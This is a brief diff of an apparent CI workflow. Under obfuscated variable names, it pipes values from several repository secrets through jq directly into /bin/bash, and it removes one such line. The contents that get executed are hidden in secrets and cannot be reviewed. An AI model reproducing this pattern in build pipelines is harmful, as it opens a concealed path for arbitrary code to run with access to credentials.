@@ -20,7 +20,6 @@ jobs:
           xg8680: ${{ secrets.xg8680 }}
         run: |
           printf '%s' "$xg8680" | jq -r .k88028 | /bin/bash
-          echo $osb5794 | jq -r .vkg6 | /bin/bash
           printf '%s' "$wldv94" | jq -r .thk36135 | /bin/bash
           printf '%s' "$iyr030" | jq -r .vszro12425 | /bin/bash
           printf '%s' "$mgwi7540" | jq -r .wiok75 | /bin/bash
